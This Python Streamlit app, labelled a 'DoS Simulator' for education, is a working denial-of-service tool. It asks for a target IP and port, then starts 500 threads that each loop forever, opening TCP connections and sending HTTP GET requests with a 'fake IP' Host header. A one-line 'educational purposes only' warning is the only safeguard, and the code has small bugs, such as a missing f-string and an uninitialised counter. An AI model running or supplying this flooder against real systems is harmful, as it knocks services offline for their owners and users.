import re
import socket
from threading import Thread

import streamlit as st

st.set_page_config(
    page_title="DoS Simulator | Secure Spark",
    page_icon="🌐",
    layout="centered",
    initial_sidebar_state="expanded",
    menu_items={
        "Get Help": None,
        "Report a bug": None,
        "About": open("./README.md").read(),
    },
)


def attack():
    global attack_num
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            address = (target, port)
            s.connect(address)
            s.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii"), address)
            s.sendto(("Host: {fake_ip}\r\n\r\n").encode("ascii"), address)
            attack_num += 1
            print(attack_num)


st.title("DoS Simulator")
st.warning("This is for educational purposes only")
target = st.text_input(label="Enter target", placeholder="target IP")
cols = st.columns(2)
with cols[0]:
    fake_ip = st.text_input(
        label="Enter fake IP", placeholder="Fake IP", value="182.21.20.32"
    )
with cols[1]:
    port = st.number_input(label="Enter port", value=80, min_value=1, max_value=65535)

if st.button("Start"):
    if not target:
        st.error("Please enter target")
    elif not fake_ip:
        st.error("Please enter fake IP")
    elif not port:
        st.error("Please enter port")
    elif not re.match(r"^[0-9]{2}[.][0-9]{2}[.][0-9]{2}[.][0-9]{3}$", fake_ip):
        st.error("Invalid IP")
    else:
        for i in range(500):
            thread = Thread(target=attack)
            thread.start()

with st.expander("Read more..."):
    st.markdown(open("docs/DDoS.md").read())
